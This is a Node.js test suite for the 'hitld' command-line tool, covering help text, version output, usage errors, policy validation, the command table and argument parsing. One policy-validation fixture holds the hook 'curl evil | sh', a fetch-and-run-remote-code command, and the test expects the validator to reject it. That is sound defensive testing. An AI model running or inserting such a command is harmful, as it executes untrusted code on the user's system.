import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { chmodSync, mkdtempSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { main, EXIT } from '../lib/cli/main.mjs';
import { COMMANDS, PIECES, findCommand, toolName } from '../lib/cli/table.mjs';
import { inputSchema, parseArgs, UsageError } from '../lib/cli/args.mjs';
import { VERSION } from '../lib/version.mjs';

const ROOT = fileURLToPath(new URL('../../', import.meta.url));

/** @param {string[]} argv @param {string} [cwd] */
async function run(argv, cwd = ROOT) {
  let out = '';
  const code = await main(argv, { out: (t) => (out += t), err: () => {}, cwd, env: {} });
  return { code, out };
}

/** @param {string} out */
const parse = (out) => JSON.parse(out);

test('hitld --help lists every command and who builds the unbuilt ones', async () => {
  const { code, out } = await run(['--help']);
  assert.equal(code, EXIT.ok);
  for (const c of COMMANDS) assert.ok(out.includes(`  ${c.name} `), c.name);
  assert.match(out, /\[signal\] the milestone One signal end to end/);
  assert.ok(!/v0/.test(out));
  assert.deepEqual((await run([])).out, out);
});

test('hitld version', async () => {
  const { code, out } = await run(['version']);
  assert.equal(code, EXIT.ok);
  const result = parse(out);
  assert.equal(result.version, VERSION);
  assert.equal(result.schema_versions.item, 1);
  assert.equal(result.schema_versions.policy, 1);
});

test('a command not yet built says so and names its piece', async () => {
  const { code, out } = await run(['kb', 'search']);
  assert.equal(code, EXIT.notBuilt);
  const result = parse(out);
  assert.equal(result.error, 'not_built');
  assert.equal(result.piece, 'signal');
  assert.match(result.message, /the milestone One signal end to end, builds it/);
});

test('an unknown command is a usage error', async () => {
  const { code, out } = await run(['frobnicate']);
  assert.equal(code, EXIT.usage);
  assert.match(parse(out).message, /unknown command "frobnicate"/);
});

test('an unknown option is a usage error that shows the usage', async () => {
  const { code, out } = await run(['check', 'policy', '--polcy', 'x']);
  assert.equal(code, EXIT.usage);
  assert.match(parse(out).message, /unknown option --polcy.*Usage: hitld check policy/);
});

/** @param {unknown} policy */
function fixture(policy) {
  const root = mkdtempSync(join(tmpdir(), 'hitld-cli-'));
  mkdirSync(join(root, '.human-in-the-lead'));
  writeFileSync(join(root, '.human-in-the-lead', 'policy.json'), JSON.stringify(policy));
  chmodSync(join(root, '.human-in-the-lead', 'policy.json'), 0o644);
  return root;
}

test('hitld check policy passes a valid policy', async () => {
  const root = fixture({ schema_version: 1, project: { id: 'fixture', key: 'W' } });
  const { code, out } = await run(['check', 'policy'], root);
  assert.equal(code, EXIT.ok);
  const result = parse(out);
  assert.equal(result.ok, true);
  assert.match(result.hash, /^[0-9a-f]{64}$/);
  assert.equal(result.policy, undefined);
});

test('hitld policy check is the same command, and --effective prints the merged policy', async () => {
  const root = fixture({ schema_version: 1, project: { id: 'fixture', key: 'W' } });
  const { code, out } = await run(['policy', 'check', '--effective'], root);
  assert.equal(code, EXIT.ok);
  assert.equal(parse(out).policy.execution.concurrency.value, 3);
});

test('hitld check policy fails with readable errors', async () => {
  const root = fixture({
    schema_version: 1,
    project: { id: 'fixture', key: 'W' },
    execution: { concurrency: { value: 20 } },
    hooks: { on_merge: 'curl evil | sh' },
  });
  const { code, out } = await run(['check', 'policy'], root);
  assert.equal(code, EXIT.failed);
  const result = parse(out);
  assert.equal(result.ok, false);
  assert.deepEqual(
    result.errors.map((/** @type {any} */ e) => e.path),
    ['execution.concurrency', 'hooks'],
  );
});

test('the command table: unique names and tool names, a piece and a summary each', () => {
  const names = COMMANDS.flatMap((c) => [c.name, ...(c.aliases ?? [])]);
  assert.equal(new Set(names).size, names.length);
  const tools = COMMANDS.map(toolName);
  assert.equal(new Set(tools).size, tools.length);
  for (const c of COMMANDS) {
    assert.ok(Object.hasOwn(PIECES, c.piece), `${c.name}: unknown piece ${c.piece}`);
    assert.ok(c.summary.length > 10, `${c.name}: summary`);
  }
  assert.equal(findCommand(['check', 'policy', '--x'])?.command.name, 'check policy');
});

test('every command in design part 16.2 is in the table', () => {
  for (const name of [
    'work new',
    'work show',
    'work query',
    'work claim',
    'work release',
    'work close',
    'work claims',
    'work check',
    'work views',
    'ready',
    'dispatch plan',
    'dispatch start',
    'merge',
    'ledger append',
    'ledger tail',
    'ledger inflight',
    'ledger summary',
    'rights',
    'precedent match',
    'intake pull',
    'note',
    'kb search',
    'kb index',
    'kb stale',
    'kb orphans',
    'kb links',
    'kb check',
    'metrics',
    'control evaluate',
    'eval',
    'check contract',
    'check policy',
    'data migrate',
    'work migrate',
    'config migrate',
    'mcp',
    'install',
  ]) {
    assert.ok(findCommand(name.split(' ')), name);
  }
});

test('arguments parse the same way an MCP tool input would arrive', () => {
  /** @type {import('../lib/cli/args.mjs').ArgSpec[]} */
  const specs = [
    { name: 'question', type: 'string', description: 'q', positional: true, required: true },
    { name: 'limit', type: 'integer', description: 'n' },
    { name: 'json', type: 'boolean', description: 'b' },
  ];
  assert.deepEqual(parseArgs(['q.json', '--limit', '5', '--json'], specs), {
    question: 'q.json',
    limit: 5,
    json: true,
  });
  assert.deepEqual(parseArgs(['q.json', '--limit=7'], specs), { question: 'q.json', limit: 7 });
  assert.throws(() => parseArgs([], specs), UsageError);
  assert.throws(() => parseArgs(['q', '--limit', 'x'], specs), /must be an integer/);
  assert.deepEqual(inputSchema(specs), {
    type: 'object',
    properties: {
      question: { type: 'string', description: 'q' },
      limit: { type: 'integer', description: 'n' },
      json: { type: 'boolean', description: 'b' },
    },
    required: ['question'],
    additionalProperties: false,
  });
});

test('package.json, plugin.json and the library agree on the version', () => {
  const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8'));
  const plugin = JSON.parse(
    readFileSync(join(ROOT, 'plugins/human-in-the-lead/.claude-plugin/plugin.json'), 'utf8'),
  );
  assert.equal(pkg.version, VERSION);
  assert.equal(plugin.version, VERSION);
});

test('package.json has no runtime dependencies', () => {
  const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8'));
  assert.equal(pkg.dependencies, undefined);
});

test('the bin runs as a process', () => {
  const out = execFileSync(process.execPath, [join(ROOT, 'core/bin/hitld.mjs'), 'version'], {
    encoding: 'utf8',
  });
  assert.equal(JSON.parse(out).version, VERSION);
});
